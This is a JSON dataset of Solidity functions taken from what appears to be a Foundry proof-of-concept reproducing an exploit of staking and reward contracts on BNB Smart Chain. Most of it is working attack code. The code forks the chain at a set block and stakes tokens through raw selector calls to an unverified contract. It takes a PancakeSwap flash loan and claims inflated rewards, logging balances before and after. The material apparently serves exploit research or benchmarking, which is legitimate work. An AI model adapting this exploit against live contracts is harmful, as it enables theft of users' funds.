[
  {
    "contract/interface": "IBUSDT_MetaWin",
    "source_type": "victim_contract",
    "function_name": "buy",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "exploit",
    "original_code": "    function exploit() external {\n        setApprovals();\n        BUSDT_MetaWin.buy(6069);\n        BindingContract.bindParent(msg.sender);\n        (bool success,) = vulnContract.call(abi.encodeWithSelector(bytes4(0x1f6b08a4), 1));\n        require(success, \"Call to func with selector 0x1f6b08a4 not successful\");\n        (success,) = vulnContract.call(abi.encodeWithSelector(bytes4(0x61b761d5), 200e18));\n        require(success, \"Call to func with selector 0x61b761d5 not successful\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        // Claim rewards in this call:\n        (bool success,) = vulnContract.call(abi.encodeWithSelector(bytes4(0xd9574d4c)));\n        require(success, \"Call to func with selector 0xd9574d4c not successful\");\n\n        // Repaying flashloan\n        BUSDT.transfer(address(FCN_BUSDT), 10_000 * 1e18);\n        FCN.transfer(address(FCN_BUSDT), 100e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 33_972_111);\n        vm.label(address(BUSDT), \"BUSDT\");\n        vm.label(address(FCN), \"FCN\");\n        vm.label(address(KLEN), \"KLEN\");\n        vm.label(address(TRUST), \"TRUST\");\n        vm.label(address(MDAO), \"MDAO\");\n        vm.label(address(FCN_BUSDT), \"FCN_BUSDT\");\n        vm.label(address(BUSDT_MetaWin), \"BUSDT_MetaWin\");\n        vm.label(address(BindingContract), \"BindingContract\");\n        vm.label(vulnContract, \"vulnContract\");\n        vm.label(addrToBind, \"addrToBind\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // Exploiter transfer to attack contract following amounts of tokens (for staking) before attack:\n        deal(address(TRUST), address(this), 171_150_509_328_412_454 + 283_615_706_379_311_069);\n        deal(address(KLEN), address(this), 2848 * 1e18 + 2_999_999_999_999_999_999_999);\n        deal(address(MDAO), address(this), 360_000_000_000_000_004_830 + 2_700_000_000_000_000_007_354);\n        deal(address(FCN), address(this), 190e12);\n        deal(address(BUSDT), address(this), 400e18 + 780_008_559_000_000_000_000);\n\n        emit log_named_decimal_uint(\n            \"Exploiter BUSDT balance before attack\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\"Exploiter FCN balance before attack\", FCN.balanceOf(address(this)), FCN.decimals());\n\n        // Approving tokens to vulnerable, unverified contract\n        setApprovals();\n\n        // Stake tokens TX\n        BUSDT_MetaWin.buy(7690);\n        BindingContract.bindParent(addrToBind);\n        (bool success,) = vulnContract.call(abi.encodeWithSelector(bytes4(0x1f6b08a4), 1));\n        require(success, \"Call to func with selector 0x1f6b08a4 not successful\");\n        (success,) = vulnContract.call(abi.encodeWithSelector(bytes4(0x61b761d5), 200e18));\n        require(success, \"Call to func with selector 0x61b761d5 not successful\");\n\n        HelperExploitContract helper = new HelperExploitContract();\n        transferTokens(address(helper));\n        helper.exploit();\n\n        // Claim tokens TX\n        vm.roll(33_972_130);\n        FCN_BUSDT.swap(0, BUSDT.balanceOf(address(FCN_BUSDT)) - 20e15, address(this), abi.encode(0));\n        emit log_named_decimal_uint(\n            \"Exploiter BUSDT balance after attack\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\"Exploiter FCN balance after attack\", FCN.balanceOf(address(this)), FCN.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBindingContract",
    "source_type": "victim_contract",
    "function_name": "bindParent",
    "original_code": "",
    "description": ""
  }
]